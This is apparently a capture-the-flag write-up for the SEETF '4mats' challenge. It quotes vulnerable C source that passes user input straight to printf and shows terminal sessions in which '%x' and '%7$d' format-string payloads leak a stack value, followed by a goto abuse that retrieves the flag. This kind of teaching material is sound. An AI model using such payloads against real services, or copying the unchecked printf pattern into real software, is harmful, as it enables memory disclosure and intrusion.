# 4mats
![](Pasted%20image%2020220605222415.png)

## Solution

Well my writeup while doing the challenge got lost so I had to redo this challenge. Fortunately it was a fun take on the format string vulnerability.

### Analysis

I read the source code given in `vuln.c`

```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char name[16];
char echo[100];
int number;
int guess;
int set = 0;
char format[64] = {0};


void guess_me(int fav_num){
    printf("Guess my favourite number!\n");
    scanf("%d", &guess);
    if (guess == fav_num){
        printf("Yes! You know me so well!\n");
	system("cat flag");
        exit(0);}
   else{
       printf("Not even close!\n");
   }
       
}


int main() {

mat1:
    printf("Welcome to SEETF!\n");
    printf("Please enter your name to register: %s\n", name);
    read(0, name, 16);

    printf("Welcome: %s\n", name);

    while(1) {
mat2:
        printf("Let's get to know each other!\n");
        printf("1. Do you know me?\n");
        printf("2. Do I know you?\n");

mat3:
        scanf("%d", &number);


        switch (number)
        {
            case 1:
                srand(time(NULL));
                int fav_num = rand() % 1000000;
		set += 1;
mat4:
                guess_me(fav_num);
                break;

            case 2:
mat5:
                printf("Whats your favourite format of CTFs?\n");
		read(0, format, 64);
                printf("Same! I love \n");
		printf(format);
                printf("too!\n");
                break;

            default:
                printf("I print instructions 4 what\n");
		if (set == 1)
mat6:
                    goto mat1;
		else if (set == 2)
		    goto mat2;
		else if (set == 3)
mat7:
                    goto mat3;
		else if (set == 4)
                    goto mat4;
		else if (set == 5)
                    goto mat5;
		else if (set == 6)
                    goto mat6;
		else if (set == 7)
                    goto mat7;
                break;
        }
    }
    return 0;
}

```

The most interesting things is that there are gotos which we could potentially abuse, some like `mat4` even in places where the variables are not initialised properly yet.

### Steps

Firstly I increased `set` to 1

```
┌──(kali㉿kali)-[~/Documents/Notes/SEETF/username_gen]
└─$ nc fun.chall.seetf.sg 50001
Welcome to SEETF!
Please enter your name to register: 
hacker
Welcome: hacker

Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
0 
Not even close!
```

I then displayed the contents on the stack using the format string vulnerability

```
Let's get to know each other!
1. Do you know me?
2. Do I know you?
2
Whats your favourite format of CTFs?
%x %x %x %x %x %x %x %x %x %x %x %x 
Same! I love 
804a080 40 8048756 1 ffcecec4 ffcececc 85822 f7fbe3dc ffcece30 0 f7e26647 f7fbe000 
too!
```

I increased the value of `set` to 2 and viewed the contents on the stack. Noticed that the 7th value `cf9e5` is different from the previous 7th value `85822`. The only values that changed so far are `set = 2` and `fav_num`. We can hence infer that the 7th value is `fav_num`

```
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
0
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
2
Whats your favourite format of CTFs?

Same! I love 

x 804a080 40 8048756 1 ffcecec4 ffcececc cf9e5 f7fbe3dc ffcece30 0 f7e26647 
too!
```

I increased the value of `set` to 3 and then to 4

```
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
0
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
0
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
2
```

I displayed the 7th value on the stack in denary.

```
Whats your favourite format of CTFs?
%7$d
Same! I love 
610084
 804a080 40 8048756 1 ffcecec4 ffcececc 94f24 f7fbe3dc ffcece30 0 
too!
```

Lastly, i jumped to `mat4` by not selecting any of the current options, and entered the `fav_num` to get the flag

```
Let's get to know each other!
1. Do you know me?
2. Do I know you?
4
I print instructions 4 what
Guess my favourite number!
610084
Yes! You know me so well!
SEE{4_f0r_4_f0rm4t5_0ebdc2b23c751d965866afe115f309ef}
┌──(kali㉿kali)-[~/Documents/Notes/SEETF/username_gen]
└─$ 

```

## Flag
`SEE{4_f0r_4_f0rm4t5_0ebdc2b23c751d965866afe115f309ef}`